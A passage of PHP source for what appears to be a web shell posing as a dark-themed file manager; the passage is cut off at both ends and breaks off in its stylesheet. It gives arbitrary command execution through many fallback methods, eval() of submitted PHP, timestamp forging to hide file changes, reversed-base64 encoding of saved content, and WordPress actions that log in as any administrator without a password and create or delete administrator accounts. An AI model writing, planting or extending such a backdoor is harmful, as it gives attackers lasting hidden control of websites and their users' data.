            
            $start_time = microtime(true);
            try {
                $stmt = $db_pdo->query($db_sql);
                $end_time = microtime(true);
                $elapsed = $end_time - $start_time;
                if ($stmt) {
                    $db_query_results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    $row_count = count($db_query_results);
                    $db_query_info = "Browsing table '" . htmlspecialchars($db_active_table) . "'. Returned $row_count rows in " . number_format($elapsed, 4) . " seconds.";
                } else {
                    $db_error = "Failed to retrieve rows.";
                }
            } catch (PDOException $e) {
                $db_error = "SQL Error: " . $e->getMessage();
            }
        }
        setcookie('fm_tab', 'sql', time() + 86400 * 30, '/');
        $_COOKIE['fm_tab'] = 'sql';
        $active_tab = 'sql';
    }
    
    // Change Directory
    if ($action === 'change_dir') {
        $target = (isset($_POST['target_dir']) ? $_POST['target_dir'] : '');
        if ($target !== '') {
            $abs_target = realpath($target);
            if ($abs_target !== false && is_dir($abs_target)) {
                setcookie('fm_dir', $abs_target, time() + 86400 * 30, '/');
            } else {
                set_toast('Invalid directory path.', 'error');
            }
        } else {
            setcookie('fm_dir', $default_dir, time() + 86400 * 30, '/');
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Set Sort
    if ($action === 'set_sort') {
        $key = isset($_POST['sort_by']) ? $_POST['sort_by'] : 'name';
        $order = isset($_POST['sort_order']) ? $_POST['sort_order'] : 'asc';
        setcookie('fm_sort_by', $key, time() + 86400 * 30, '/');
        setcookie('fm_sort_order', $order, time() + 86400 * 30, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Create File
    if ($action === 'create_file') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target) {
            if (!file_exists($target)) {
                if (@file_put_contents($target, '') !== false) {
                    set_toast("File '$name' created.");
                } else {
                    set_toast("Failed to create file.", "error");
                }
            } else {
                set_toast("File already exists.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Create Folder
    if ($action === 'create_folder') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target) {
            if (!file_exists($target)) {
                if (@mkdir($target, 0777, true)) {
                    set_toast("Folder '$name' created.");
                } else {
                    set_toast("Failed to create folder.", "error");
                }
            } else {
                set_toast("Folder already exists.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Edit File Request
    if ($action === 'edit_file') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target) && is_file($target)) {
            $filesize = @filesize($target);
            if ($filesize !== false && $filesize >= 2 * 1024 * 1024) {
                set_toast("File is too large to edit in browser (limit: 2MB).", "error");
                header("Location: " . $_SERVER['PHP_SELF']);
        exit;

            }
            $edit_mode = true;
            $edit_filename = $name;
            $edit_content = @file_get_contents($target);
            if ($edit_content === false) {
                $edit_content = '';
                set_toast("Unable to read file.", "error");
                header("Location: " . $_SERVER['PHP_SELF']);
        exit;

            }
        } else {
            set_toast("File not found.", "error");
            header("Location: " . $_SERVER['PHP_SELF']);
        exit;

        }
    }
    
    // Save File Content
    if ($action === 'save_file') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $content = (isset($_POST['content']) ? $_POST['content'] : '');
        $content = base64_decode(strrev($content));
        $preserve_mtime = isset($_POST['preserve_mtime']);
        $target = get_safe_target_path($name);
        
        if ($target && file_exists($target) && is_file($target)) {
            $original_mtime = @filemtime($target);
            if (@file_put_contents($target, $content) !== false) {
                if ($preserve_mtime && $original_mtime !== false) {
                    @touch($target, $original_mtime);
                    set_toast("File '$name' saved, original modification time preserved.");
                } else {
                    set_toast("File '$name' saved.");
                }
            } else {
                set_toast("Failed to save file.", "error");
            }
            $edit_mode = true;
            $edit_filename = $name;
            $edit_content = @file_get_contents($target);
            if ($edit_content === false) {
                $edit_content = $content;
            }
        } else {
            set_toast("File not found.", "error");
            header("Location: " . $_SERVER['PHP_SELF']);
        exit;

        }
    }
    
    // Delete File / Folder
    if ($action === 'delete') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target)) {
            if (is_dir($target)) {
                if (delete_dir_recursive($target)) {
                    set_toast("Folder '$name' deleted.");
                } else {
                    set_toast("Failed to delete folder.", "error");
                }
            } else {
                if (unlink($target)) {
                    set_toast("File '$name' deleted.");
                } else {
                    set_toast("Failed to delete file.", "error");
                }
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Rename / Move
    if ($action === 'rename') {
        $old_name = (isset($_POST['old_name']) ? $_POST['old_name'] : '');
        $new_name = (isset($_POST['new_name']) ? $_POST['new_name'] : '');
        $old_target = get_safe_target_path($old_name);
        $new_target = get_safe_target_path($new_name);
        
        if ($old_target && $new_target && file_exists($old_target)) {
            if (!file_exists($new_target)) {
                if (rename($old_target, $new_target)) {
                    set_toast("Renamed to '$new_name'.");
                } else {
                    set_toast("Failed to rename.", "error");
                }
            } else {
                set_toast("Item already exists.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Chmod Item
    if ($action === 'chmod') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $mode = (isset($_POST['mode']) ? $_POST['mode'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target)) {
            $octal_mode = octdec($mode);
            if (@chmod($target, $octal_mode)) {
                set_toast("Permissions for '$name' updated to $mode.");
            } else {
                set_toast("Failed to change permissions.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Touch Item (Change Modification Date)
    if ($action === 'touch') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $mtime_str = (isset($_POST['mtime']) ? $_POST['mtime'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target)) {
            $timestamp = strtotime($mtime_str);
            if ($timestamp !== false) {
                if (@touch($target, $timestamp)) {
                    set_toast("Modification date for '$name' updated.");
                } else {
                    set_toast("Failed to change modification date.", "error");
                }
            } else {
                set_toast("Invalid date format. Use YYYY-MM-DD HH:MM:SS.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Copy/Cut to Clipboard
    if ($action === 'copy' || $action === 'cut') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target)) {
            setcookie('fm_clip_path', json_encode([$target]), time() + 3600, '/');
            setcookie('fm_clip_type', $action, time() + 3600, '/');
            $verb = ($action === 'copy') ? 'copied' : 'cut';
            set_toast("Item {$verb}.");
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Paste Clipboard Content
    if ($action === 'paste') {
        $clip_path = (isset($_COOKIE['fm_clip_path']) ? $_COOKIE['fm_clip_path'] : '');
        $clip_type = (isset($_COOKIE['fm_clip_type']) ? $_COOKIE['fm_clip_type'] : 'copy');
        
        if ($clip_path !== '') {
            $paths = json_decode($clip_path, true);
            if (!is_array($paths)) {
                $paths = [$clip_path];
            }
            
            $success_count = 0;
            $failed_count = 0;
            $same_dir = false;
            
            foreach ($paths as $path) {
                $src_path = realpath($path);
                if ($src_path !== false && file_exists($src_path)) {
                    $basename = basename($src_path);
                    $dest_path = $current_abs_dir . DIRECTORY_SEPARATOR . $basename;
                    
                    if ($src_path === $dest_path) {
                        $same_dir = true;
                        continue;
                    }
                    
                    if ($clip_type === 'cut') {
                        if (rename($src_path, $dest_path)) {
                            $success_count++;
                        } else {
                            $failed_count++;
                        }
                    } else {
                        if (copy_recursive($src_path, $dest_path)) {
                            $success_count++;
                        } else {
                            $failed_count++;
                        }
                    }
                } else {
                    $failed_count++;
                }
            }
            
            if ($success_count > 0) {
                $action_verb = ($clip_type === 'cut') ? 'moved' : 'copied';
                set_toast("Successfully {$action_verb} {$success_count} item(s).");
                setcookie('fm_clip_path', '', time() - 3600, '/');
                setcookie('fm_clip_type', '', time() - 3600, '/');
            }
            
            if ($failed_count > 0) {
                set_toast("Failed to process {$failed_count} item(s).", "error");
            }
            
            if ($same_dir && $success_count === 0 && $failed_count === 0) {
                set_toast("Source and destination are the same.", "error");
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Clear Clipboard
    if ($action === 'clear_clipboard') {
        setcookie('fm_clip_path', '', time() - 3600, '/');
        setcookie('fm_clip_type', '', time() - 3600, '/');
        set_toast("Clipboard cleared.");
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Bulk Delete
    if ($action === 'bulk_delete') {
        $selected_items = (isset($_POST['selected_items']) ? $_POST['selected_items'] : []);
        $success_count = 0;
        $failed_count = 0;
        
        foreach ($selected_items as $name) {
            $target = get_safe_target_path($name);
            if ($target && file_exists($target)) {
                if (is_dir($target)) {
                    if (delete_dir_recursive($target)) {
                        $success_count++;
                    } else {
                        $failed_count++;
                    }
                } else {
                    if (unlink($target)) {
                        $success_count++;
                    } else {
                        $failed_count++;
                    }
                }
            } else {
                $failed_count++;
            }
        }
        
        if ($success_count > 0) {
            set_toast("Successfully deleted {$success_count} item(s).");
        }
        if ($failed_count > 0) {
            set_toast("Failed to delete {$failed_count} item(s).", "error");
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Bulk Copy / Bulk Cut
    if ($action === 'bulk_copy' || $action === 'bulk_cut') {
        $selected_items = (isset($_POST['selected_items']) ? $_POST['selected_items'] : []);
        $targets = [];
        
        foreach ($selected_items as $name) {
            $target = get_safe_target_path($name);
            if ($target && file_exists($target)) {
                $targets[] = $target;
            }
        }
        
        if (!empty($targets)) {
            $clip_action = ($action === 'bulk_copy') ? 'copy' : 'cut';
            setcookie('fm_clip_path', json_encode($targets), time() + 3600, '/');
            setcookie('fm_clip_type', $clip_action, time() + 3600, '/');
            $verb = ($clip_action === 'copy') ? 'copied' : 'cut';
            set_toast("Successfully {$verb} " . count($targets) . " item(s) to clipboard.");
        } else {
            set_toast("No valid items selected.", "error");
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Upload File
    if ($action === 'upload') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $tmp_name = $_FILES['file']['tmp_name'];
            $raw_name = basename($_FILES['file']['name']);
            $name = trim(str_replace(['\\', '/', '..'], '', $raw_name));
            if ($name !== '') {
                $dest = $current_abs_dir . DIRECTORY_SEPARATOR . $name;
                if (move_uploaded_file($tmp_name, $dest)) {
                    set_toast("Uploaded '$name'.");
                } else {
                    set_toast("Upload failed.", "error");
                }
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Download File
    if ($action === 'download') {
        $name = (isset($_POST['name']) ? $_POST['name'] : '');
        $target = get_safe_target_path($name);
        if ($target && file_exists($target) && is_file($target)) {
            if (ob_get_level()) {
                ob_end_clean();
            }
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($target) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($target));
            readfile($target);
            exit;
        } else {
            set_toast("File not found or cannot be downloaded.", "error");
            header("Location: " . $_SERVER['PHP_SELF']);
        exit;

        }
    }
    
    // Execute command in Terminal
    if ($action === 'exec_cmd') {
        $terminal_cmd = (isset($_POST['cmd']) ? $_POST['cmd'] : '');
        $selected_exec_method = (isset($_POST['exec_method']) ? $_POST['exec_method'] : 'auto');
        
        $valid_methods = ['auto', 'shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'backticks', 'wscript', 'ffi', 'imap'];
        if (!in_array($selected_exec_method, $valid_methods)) {
            $selected_exec_method = 'auto';
        }
        setcookie('fm_exec_method', $selected_exec_method, time() + 86400 * 30, '/');
        
        if ($terminal_cmd !== '') {
            $full_cmd = 'cd /d ' . escapeshellarg($current_abs_dir) . ' && ' . $terminal_cmd;
            if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
                $full_cmd = 'cd ' . escapeshellarg($current_abs_dir) . ' && ' . $terminal_cmd;
            }
            $res = run_system_cmd($full_cmd, $selected_exec_method);
            $terminal_output = $res['output'];
            $last_used_method = $res['used'];
            setcookie('fm_last_exec_method', $last_used_method, time() + 86400 * 30, '/');
        }
        setcookie('fm_tab', 'terminal', time() + 3600, '/');
        $_COOKIE['fm_tab'] = 'terminal';
        $active_tab = 'terminal';
    }
    
    // Execute PHP code
    if ($action === 'exec_php') {
        $php_code = (isset($_POST['php_code']) ? $_POST['php_code'] : '');
        if ($php_code !== '') {
            ob_start();
            try {
                $eval_code = $php_code;
                if (strpos($eval_code, '<?php') === 0) {
                    $eval_code = substr($eval_code, 5);
                }
                if (substr($eval_code, -2) === '?>') {
                    $eval_code = substr($eval_code, 0, -2);
                }
                eval($eval_code);
            } catch (Exception $e) {
                echo "Exception: " . $e->getMessage();
            }
            $php_output = ob_get_clean();
        }
        setcookie('fm_tab', 'php', time() + 3600, '/');
        $_COOKIE['fm_tab'] = 'php';
        $active_tab = 'php';
    }

    // Save WP Path
    if ($action === 'set_wp_path') {
        $path = (isset($_POST['wp_path']) ? $_POST['wp_path'] : '');
        $safe_mode = (isset($_POST['wp_safe_mode']) ? '1' : '0');
        setcookie('fm_wp_safe_mode', $safe_mode, time() + 86400 * 30, '/');
        if ($path !== '') {
            $resolved = realpath($path);
            if ($resolved !== false && is_dir($resolved) && file_exists($resolved . DIRECTORY_SEPARATOR . 'wp-load.php')) {
                setcookie('fm_wp_path', $resolved, time() + 86400 * 30, '/');
                set_toast("WordPress path saved successfully.");
            } else {
                set_toast("Invalid WordPress path. wp-load.php not found.", "error");
            }
        }
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Toggle WP Safe Mode
    if ($action === 'toggle_wp_safe_mode') {
        $current = isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1';
        if ($current) {
            setcookie('fm_wp_safe_mode', '0', time() + 86400 * 30, '/');
            set_toast("WordPress Safe Mode disabled.");
        } else {
            setcookie('fm_wp_safe_mode', '1', time() + 86400 * 30, '/');
            set_toast("WordPress Safe Mode enabled. Plugins bypassed.");
        }
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Clear WP Path
    if ($action === 'clear_wp_path') {
        setcookie('fm_wp_path', 'none', time() + 86400 * 30, '/');
        setcookie('fm_wp_safe_mode', '0', time() - 3600, '/');
        set_toast("WordPress path cleared.");
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Log in as selected WordPress administrator
    if ($action === 'wp_login_admin') {
        $user_id = intval((isset($_POST['user_id']) ? $_POST['user_id'] : 0));
        
        if ($wp_path !== '' && $user_id > 0) {
            if (bootstrap_wordpress($wp_path)) {
                if (function_exists('wp_set_auth_cookie') && function_exists('wp_set_current_user')) {
                    wp_set_current_user($user_id);
                    wp_set_auth_cookie($user_id, true);
                    
                    $admin_url = admin_url();
                    header("Location: " . $admin_url);
                    exit;
                } else {
                    set_toast("Required WordPress login functions are not available.", "error");
                }
            } else {
                set_toast("Failed to bootstrap WordPress.", "error");
            }
        } else {
            set_toast("WordPress path not set or invalid user selected.", "error");
        }
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Create a new WordPress administrator
    if ($action === 'wp_create_admin') {
        $wp_user = trim((isset($_POST['wp_user']) ? $_POST['wp_user'] : ''));
        $wp_pass = (isset($_POST['wp_pass']) ? $_POST['wp_pass'] : '');
        $wp_email = trim((isset($_POST['wp_email']) ? $_POST['wp_email'] : ''));
        
        if ($wp_path !== '' && $wp_user !== '' && $wp_pass !== '' && $wp_email !== '') {
            if (bootstrap_wordpress($wp_path)) {
                if (function_exists('username_exists') && function_exists('email_exists') && function_exists('wp_insert_user')) {
                    if (username_exists($wp_user)) {
                        set_toast("Username '$wp_user' already exists in WordPress.", "error");
                    } elseif (email_exists($wp_email)) {
                        set_toast("Email '$wp_email' already exists in WordPress.", "error");
                    } else {
                        $userdata = [
                            'user_login' => $wp_user,
                            'user_pass'  => $wp_pass,
                            'user_email' => $wp_email,
                            'role'       => 'administrator'
                        ];
                        $user_id = wp_insert_user($userdata);
                        if (is_wp_error($user_id)) {
                            set_toast("Failed to create user: " . $user_id->get_error_message(), "error");
                        } else {
                            $user = new WP_User($user_id);
                            $user->set_role('administrator');
                            set_toast("Administrator user '$wp_user' created successfully!");
                        }
                    }
                } else {
                    set_toast("WordPress user functions are not available.", "error");
                }
            } else {
                set_toast("Failed to bootstrap WordPress.", "error");
            }
        } else {
            set_toast("Please fill in all user details.", "error");
        }
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Delete a WordPress administrator
    if ($action === 'wp_delete_admin') {
        $user_id = intval((isset($_POST['user_id']) ? $_POST['user_id'] : 0));
        
        if ($wp_path !== '' && $user_id > 0) {
            if (bootstrap_wordpress($wp_path)) {
                if (!function_exists('wp_delete_user')) {
                    require_once(ABSPATH . 'wp-admin/includes/user.php');
                }
                if (function_exists('wp_delete_user')) {
                    $user = get_userdata($user_id);
                    if ($user) {
                        if (in_array('administrator', $user->roles)) {
                            $result = wp_delete_user($user_id);
                            if ($result) {
                                set_toast("Administrator user '{$user->user_login}' deleted successfully!");
                            } else {
                                set_toast("Failed to delete user '{$user->user_login}'.", "error");
                            }
                        } else {
                            set_toast("User is not an administrator.", "error");
                        }
                    } else {
                        set_toast("User not found.", "error");
                    }
                } else {
                    set_toast("WordPress delete user function is not available.", "error");
                }
            } else {
                set_toast("Failed to bootstrap WordPress.", "error");
            }
        } else {
            set_toast("WordPress path not set or invalid user selected.", "error");
        }
        setcookie('fm_tab', 'wp', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
}

// --- 6. READ FILE/FOLDER DATA FOR LIST ---
$scan_items = [];
if (is_dir($current_abs_dir)) {
    $dir_handle = @opendir($current_abs_dir);
    if ($dir_handle) {
        while (($file = readdir($dir_handle)) !== false) {
            if ($file === '.' || $file === '..') continue;
            
            $full_path = $current_abs_dir . DIRECTORY_SEPARATOR . $file;
            $is_directory = is_dir($full_path);
            $stat = @stat($full_path);
            
            $size = $is_directory ? '-' : ((isset($stat['size']) ? $stat['size'] : 0));
            $mtime = (isset($stat['mtime']) ? $stat['mtime'] : time());
            $perms = get_perms_string($full_path);
            $owner = get_owner_string($full_path);
            $is_writable = is_writable($full_path);
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            
            $scan_items[] = [
                'name' => $file,
                'is_dir' => $is_directory,
                'size' => $size,
                'mtime' => $mtime,
                'perms' => $perms,
                'owner' => $owner,
                'is_writable' => $is_writable,
                'ext' => $ext
            ];
        }
        closedir($dir_handle);
    }
}

// Parse sorting parameters from cookies or defaults
$sort_by = isset($_COOKIE['fm_sort_by']) ? $_COOKIE['fm_sort_by'] : 'name';
$sort_order = isset($_COOKIE['fm_sort_order']) ? $_COOKIE['fm_sort_order'] : 'asc';

// Sort folders first, then items by requested key and order
usort($scan_items, function($a, $b) use ($sort_by, $sort_order) {
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    
    // Determine factor based on asc/desc order
    $order_factor = ($sort_order === 'desc') ? -1 : 1;
    
    if ($sort_by === 'size') {
        // Folders are already separated. For files, compare sizes.
        $size_a = $a['is_dir'] ? 0 : intval($a['size']);
        $size_b = $b['is_dir'] ? 0 : intval($b['size']);
        if ($size_a === $size_b) {
            return strcasecmp($a['name'], $b['name']);
        }
        return ($size_a < $size_b ? -1 : 1) * $order_factor;
    } elseif ($sort_by === 'date') {
        if ($a['mtime'] === $b['mtime']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return ($a['mtime'] < $b['mtime'] ? -1 : 1) * $order_factor;
    } else {
        // Default sort by name
        return strcasecmp($a['name'], $b['name']) * $order_factor;
    }
});

// WordPress setup
$wp_safe_mode = (isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1');
$wp_is_valid = false;
$wp_site_name = '';
$wp_site_url = '';
$wp_admins = [];

if ($active_tab === 'wp' && $wp_path !== '') {
    if (bootstrap_wordpress($wp_path)) {
        $wp_is_valid = true;
        if (function_exists('get_bloginfo')) {
            $wp_site_name = get_bloginfo('name');
            $wp_site_url = get_bloginfo('url');
        }
        $wp_admins = get_wordpress_admins();
    }
}

$clipboard_path = (isset($_COOKIE['fm_clip_path']) ? $_COOKIE['fm_clip_path'] : '');
$clipboard_type = (isset($_COOKIE['fm_clip_type']) ? $_COOKIE['fm_clip_type'] : '');
$clipboard_label = '';
if ($clipboard_path !== '') {
    $decoded_clip = json_decode($clipboard_path, true);
    if (is_array($decoded_clip)) {
        $clipboard_count = count($decoded_clip);
        if ($clipboard_count === 1) {
            $clipboard_label = basename($decoded_clip[0]);
        } else {
            $clipboard_label = $clipboard_count . " items";
        }
    } else {
        $clipboard_label = basename($clipboard_path);
    }
}

function format_bytes($bytes, $precision = 1) {
    if (!is_numeric($bytes)) return $bytes;
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars(APP_NAME); ?></title>
    <style>
        body {
            background-color: #1a1f29;
            color: #d1d5db;
            font-family: Consolas, Monaco, "Courier New", monospace;
            font-size: 13px;
            margin: 0;
            padding: 10px;
        }
        
        /* Tab Navigation Bar */
        .tabs-header {
            background-color: #11151d;
            padding: 10px 10px 0 10px;
            border: 1px solid #2d3748;
            display: flex;
            gap: 5px;
        }
        
        .tab-btn {
            display: inline-block;
            text-decoration: none;
            background: none;
            border: 1px solid transparent;
            color: #9ca3af;
            padding: 6px 16px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            border-radius: 4px 4px 0 0;
        }
        
        .tab-btn:hover {
            color: #f3f4f6;
            background-color: #1d2433;
        }
        
        .tab-btn.active {
            color: #ffffff;
            background-color: #11151d;
            border: 1px solid #2d3748;
            border-bottom-color: #11151d;
        }

        .tab-content {
            background-color: #11151d;
            padding: 15px;
            border: 1px solid #2d3748;
            border-top: none;
        }

        /* Path breadcrumbs */
        .path-bar {
            margin-bottom: 15px;
            color: #9ca3af;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
        }

        .path-btn {
            background: none;
            border: none;
            color: #38bdf8;
            cursor: pointer;
            padding: 2px 6px;
            font-family: inherit;
            font-size: 13px;
        }

        .path-btn:hover {
            text-decoration: underline;
        }

        /* Action Buttons */
        .actions-toolbar {
            display: flex;
            gap: 6px;
            margin-bottom: 15px;
        }

        .action-btn {
            background-color: #374151;
            border: 1px solid #4b5563;
            color: #ffffff;
            padding: 5px 12px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            border-radius: 4px;
        }

        .action-btn:hover {
            background-color: #4b5563;
        }

        /* Files Table */
        .files-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            border: 1px solid #2d3748;
        }

        .files-table th {
            background-color: #1f2937;
            color: #ffffff;
            padding: 8px 10px;
            border-bottom: 1px solid #2d3748;
            font-weight: normal;
        }

        .files-table th.th-sortable {
            cursor: pointer;
            user-select: none;
            transition: background-color 0.2s, color 0.2s;
        }

        .files-table th.th-sortable:hover {
            background-color: #374151;
            color: #ffffff !important;
        }

        .files-table td {
            padding: 6px 10px;
            border-bottom: 1px solid #2d3748;
        }

        .files-table tr:hover {
            background-color: #222a36;
        }

        /* Link Items */
        .item-link {
            color: #38bdf8;
            text-decoration: none;
            background: none;
            border: none;
            padding: 0;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
        }

        .item-link:hover {
            text-decoration: underline;
        }

        /* Permissions display */
        .perms-writable {
            color: #10b981; /* green */
        }

        .perms-readonly {
            color: #9ca3af; /* muted grey */
        }

        .perms-col-btn, .date-col-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            font-family: inherit;
            font-size: inherit;
            text-align: left;
        }

        .perms-col-btn:hover span, .date-col-btn:hover span {
            text-decoration: underline;
        }

        .date-col {
            color: #06b6d4; /* cyan */
        }

        /* Tiny operation action buttons */
        .op-btn {
            border: none;
            color: #ffffff;
            padding: 2px 6px;
            font-size: 11px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 2px;
            display: inline-block;
            margin-right: 3px;
            font-family: inherit;
        }

        .op-edit { background-color: #059669; } /* Green */
        .op-edit:hover { background-color: #047857; }
        .op-rename { background-color: #2563eb; } /* Blue */
        .op-rename:hover { background-color: #1d4ed8; }
        .op-download { background-color: #7c3aed; } /* Purple */
        .op-download:hover { background-color: #6d28d9; }
        .op-delete { background-color: #dc2626; } /* Red */
        .op-delete:hover { background-color: #b91c1c; }

        /* Toast Popup dismisses quickly, light on memory */
        .toast-notify {
            background-color: #111827;
            border: 1px solid #374151;
            padding: 10px 15px;
            border-radius: 4px;
            margin-bottom: 15px;
            color: #10B981;
        }
        .toast-notify.error {
            color: #EF4444;
        }

        /* Form Controls */
        .form-input {
            background-color: #111827;
            border: 1px solid #374151;
            color: #ffffff;
            padding: 5px 8px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 4px;
            margin-right: 5px;
        }

        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        /* Textarea editors (Console, PHP, Text Edit) */
        .editor-textarea {
            width: 100%;
            height: 350px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 10px;
            font-family: inherit;
            font-size: 13px;
            box-sizing: border-box;
            resize: vertical;
            line-height: 1.5;
        }

        .editor-textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }

        /* System Info table layout */
        .info-table {
            width: 100%;
            max-width: 800px;
            border: 1px solid #2d3748;
            border-collapse: collapse;
        }
        
        .info-table td {
            padding: 8px 12px;
            border: 1px solid #2d3748;
        }

        .info-table td.label-col {
            background-color: #1f2937;
            font-weight: bold;
            width: 250px;
        }

        /* Interactive forms modal simulator */
        .modal-simulation {
            background-color: #11151d;
            border: 1px solid #374151;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            max-width: 500px;
        }

        .modal-title {
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 14px;
            border-bottom: 1px solid #374151;
            padding-bottom: 5px;
        }

        /* Login Template Gating */
        .login-box {
            max-width: 320px;
            margin: 100px auto;
            background-color: #11151d;
            border: 1px solid #374151;
            padding: 25px;
            border-radius: 6px;
            text-align: center;
        }

        .login-btn {
            background-color: #3b82f6;
            border: 1px solid #2563eb;
            color: #ffffff;
            padding: 6px 20px;
            cursor: pointer;
            font-family: inherit;
            border-radius: 4px;
            font-size: 13px;
            width: 100%;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #2563eb;
        }

        /* SQL Client Layout */
        .sql-container {
            display: flex;
            gap: 15px;
            align-items: flex-start;
        }
        .sql-sidebar {
            width: 220px;
            background-color: #11151d;
            border: 1px solid #2d3748;
            border-radius: 4px;
            padding: 10px;
            box-sizing: border-box;
            max-height: 550px;
            overflow-y: auto;
        }
        .sql-main {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            gap: 15px;
            min-width: 0;
        }
        .sql-sidebar-title {
            font-weight: bold;
            color: #9ca3af;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            padding-bottom: 4px;
            border-bottom: 1px solid #2d3748;
        }
        .sql-table-item {
            display: block;
            width: 100%;
            background: none;
            border: none;
            color: #38bdf8;
            text-align: left;
            padding: 4px 6px;
            cursor: pointer;
            border-radius: 3px;
            font-family: inherit;
            font-size: 12px;
            text-decoration: none;
            box-sizing: border-box;
        }
        .sql-table-item:hover {
            background-color: #1f2937;
            color: #ffffff;
            text-decoration: underline;
        }
        .db-results-container {
            width: 100%;
            overflow-x: auto;
            border: 1px solid #2d3748;
            border-radius: 4px;
            max-height: 400px;
            overflow-y: auto;
        }
        .db-results-table {
            width: max-content;
            min-width: 100%;
            border-collapse: collapse;
            font-size: 12px;
            table-layout: auto;
        }
        .db-results-table th {
            background-color: #1f2937;
            color: #ffffff;
            padding: 6px 10px;
            border-bottom: 1px solid #2d3748;
            font-weight: normal;
            position: sticky;
            top: 0;
            z-index: 1;
            white-space: nowrap;
        }
        .db-results-table td {
            padding: 5px 10px;
            border-bottom: 1px solid #2d3748;
            color: #e5e7eb;
            white-space: nowrap;
            max-width: 400px;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .db-results-table tr:hover {
            background-color: #222a36;
        }
        .db-error-box {
            background-color: #7f1d1d;
            border: 1px solid #b91c1c;
            color: #fca5a5;
            padding: 10px 15px;
            border-radius: 4px;
            font-family: inherit;
            margin-bottom: 10px;
        }
        .db-success-box {
            background-color: #14532d;
            border: 1px solid #16a34a;
            color: #bbf7d0;
            padding: 8px 12px;
            border-radius: 4px;
            font-family: inherit;
            margin-bottom: 10px;
        }
        
        .tab-pane {
            display: none;
        }
        .tab-pane.active {
            display: block;
        }

        /* Server stats header box styling */
        .server-stats-box {
            background-color: #11151d;
            border: 1px solid #2d3748;
